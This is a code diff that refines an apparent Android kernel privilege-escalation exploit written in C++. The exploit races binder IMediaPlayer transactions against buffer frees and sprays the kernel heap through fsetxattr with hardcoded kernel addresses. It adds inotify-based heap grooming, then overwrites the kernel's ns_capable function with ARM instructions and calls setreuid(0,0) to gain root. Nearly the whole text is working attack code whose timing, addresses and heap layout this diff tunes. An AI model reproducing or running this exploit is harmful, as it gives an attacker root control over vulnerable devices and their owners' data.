@@ -5,10 +5,13 @@
 #include <sys/xattr.h>
 #include <sys/time.h>
 #include <sys/resource.h>
+#include <sys/eventfd.h>
+#include <sys/inotify.h>
+#include <poll.h>
 
 sp<IMediaPlayerService> getMediaPlayer();
 sp<IMediaPlayer> mediaPlayer;
-#define BAIT 10000
+#define BAIT 1000
 #define BUFF_SIZE 96
 Parcel dataBCArray[BAIT];
 Parcel replyBCArray[BAIT];
@@ -20,6 +23,16 @@ const uint8_t *gDataArray[BAIT];
 Parcel dataArray[BAIT], replyArray[BAIT];
 
 int fillFlag = 0;
+pthread_mutex_t alloc_mutex;
+pthread_cond_t alloc_cond;
+int global_parcel_index = 0; 
+
+volatile int stop = 0;
+char guardBuffer[1000];
+int fd_guard_heap;
+
+int watch_fd;
+int watch_wd;
 
 class MediaPlayerBase : public MediaPlayer
 {
@@ -45,7 +58,37 @@ sp<IMediaPlayerService> getMediaPlayer()
 
 }
 
-static void kernel_patch_ns_capable(unsigned long * addr) {
+void begin_watch()
+{
+        watch_fd = inotify_init1(IN_NONBLOCK);
+        if (watch_fd == -1) {
+                printf("[-] inotify_init1 failed\n");
+                return;
+        }
+
+        watch_wd = inotify_add_watch(watch_fd, "test_dir",
+                                 IN_ALL_EVENTS);
+        if (watch_wd == -1) {
+                printf("[-] Cannot watch\n");
+                return;
+        }
+}
+
+void stop_watch()
+{
+	inotify_rm_watch(watch_fd, watch_wd);
+	if (watch_fd != 1)
+	{
+		close(watch_fd);
+	}
+}
+
+void heapGuard()
+{
+	fsetxattr(fd_guard_heap, "user.g", guardBuffer, 1000, 0);
+}
+
+void kernel_patch_ns_capable(unsigned long * addr) {
         unsigned int *p = (unsigned int *)addr;
 
         p[0] = 0xD2800020;//MOV x0,#1
@@ -119,7 +162,7 @@ void* fillCpu(void *arg)
     	CPU_SET(index, &mask);
 	pid_t pid = gettid();
 	syscall(__NR_sched_setaffinity, pid, sizeof(mask), &mask);
-	printf("[+] cpu:%d, tid:%d, freeze\n", index, pid);
+	//printf("[+] cpu:%d, tid:%d, freeze\n", index, pid);
 	while (!fillFlag)
 	{
 		index++;
@@ -172,7 +215,7 @@ void heap_spray()
 	char buff[BUFF_SIZE];
 	memset(buff, 0 ,BUFF_SIZE);
 	*(size_t *)((char *)buff + 64) = 20;
-	*(size_t *)((char *)buff + 88) = 0xffffffc001d50834;
+	*(size_t *)((char *)buff + 88) = 0xffffffc001e50834;
 	fsetxattr(fd_heap_spray, "user.x", buff, BUFF_SIZE, 0);
 }
 
@@ -181,13 +224,18 @@ void heap_spray_times()
 	for (int i = 0; i < HEAP_SPRAY_TIME; i++)
 	{
 		heap_spray();
+		heapGuard();
 	}
 }
 
 void init_fd_heap_spray()
 {
-	const char * path = "/data/local/tmp/1.txt";
+	const char * path = "/data/local/tmp/test_dir/abcd.txt";
         fd_heap_spray = open(path, O_WRONLY);
+	if (fd_heap_spray < 0)
+	{
+		printf("[-] fd_heap_spray failed\n");
+	}
 }
 
 status_t init_reply_data()
@@ -209,23 +257,41 @@ void bc_free_buffer(int replyParcelIndex)
 
 void* bc_transaction(void *arg)
 {
-	int index = *(int *)arg;
-	dataBCArray[index].writeInterfaceToken(String16("android.media.IMediaPlayer"));
-	IInterface::asBinder(mediaPlayer)->transact(GET_PLAYBACK_SETTINGS, dataBCArray[index], &replyBCArray[index], 0);
+	pthread_mutex_lock(&alloc_mutex);
+	while(1) 
+	{
+		pthread_cond_wait(&alloc_cond, &alloc_mutex);
+		dataBCArray[global_parcel_index].writeInterfaceToken(String16("android.media.IMediaPlayer"));
+                IInterface::asBinder(mediaPlayer)->transact(GET_PLAYBACK_SETTINGS, dataBCArray[global_parcel_index], &replyBCArray[global_parcel_index], 0);
+	}
+	pthread_mutex_unlock(&alloc_mutex);
     	//const uint8_t * replyData = reply.data();
 	return arg;
 }
 
+void restartWatch()
+{
+	if (global_parcel_index % 200 == 0)
+	{
+		stop_watch();
+		usleep(100);
+		begin_watch();
+		usleep(100);
+	}
+}
+
 void raceWin(int replyParcelIndex)
 {
+	pthread_mutex_lock(&alloc_mutex);
 	bc_free_buffer(replyParcelIndex);
-	pthread_t id_transaction;
-	pthread_create(&id_transaction,NULL, bc_transaction, &replyParcelIndex);
-	usleep(1000);
+	global_parcel_index = replyParcelIndex;
+	pthread_cond_signal(&alloc_cond);
+	pthread_mutex_unlock(&alloc_mutex);
+	usleep(450);
 	bc_free_buffer(replyParcelIndex);
 	bc_free_buffer(replyParcelIndex - 1);
 	heap_spray_times();
-	pthread_join(id_transaction, NULL);
+	restartWatch();
 } 
 
 void raceTimes()
@@ -252,12 +318,42 @@ void put_baits()
 	}
 }
 
+void createAllocThread()
+{
+	pthread_mutex_init(&alloc_mutex, NULL);
+	pthread_cond_init (&alloc_cond, NULL);
+	pthread_t id_transaction;
+        pthread_create(&id_transaction,NULL, bc_transaction, NULL);
+}
+
+void create_test_dir()
+{
+    	system("touch /data/local/tmp/test_dir/fffdfffdfffdfffd");
+	system("touch /data/local/tmp/test_dir/abcd.txt");
+	fd_guard_heap = open("/data/local/tmp/test_dir/fffdfffdfffdfffd", O_WRONLY); 
+	if (fd_guard_heap < 0)
+	{
+		printf("[-] fd_guard_heap failed\n");
+	}
+	init_fd_heap_spray();
+}
+
+void init_test_dir()
+{
+	memset(guardBuffer, 0 ,1000);
+	system("rm -rf /data/local/tmp/test_dir ; mkdir test_dir");
+	create_test_dir();
+	begin_watch();
+}
+
 int main()
 {
+	createAllocThread();
+	nice(-20);
 	MediaPlayerBase* mediaPlayerBase = new MediaPlayerBase();
 	mediaPlayer = mediaPlayerBase->creatMediaPlayer();
 	init_reply_data();
-	init_fd_heap_spray();
+	init_test_dir();
 	int max_fds = maximize_fd_limit();
 	printf("[+] current pid:%d, max_fd:%d, descript:%lx\n", getpid(), max_fds, get_fack_block(0x80000000));
 	put_baits();
@@ -265,6 +361,7 @@ int main()
 	raceTimes();
 	printf("[+] race finish\n");
 	fillFlag = 1;
+	stop = 1;
 	unsigned long ns_capable_addr  = 0xffffffc0000b1024 - 0xffffffc000000000 + 0xffffffc200000000;
         kernel_patch_ns_capable((unsigned long *) ns_capable_addr);
 	if(setreuid(0, 0) || setregid(0, 0)){
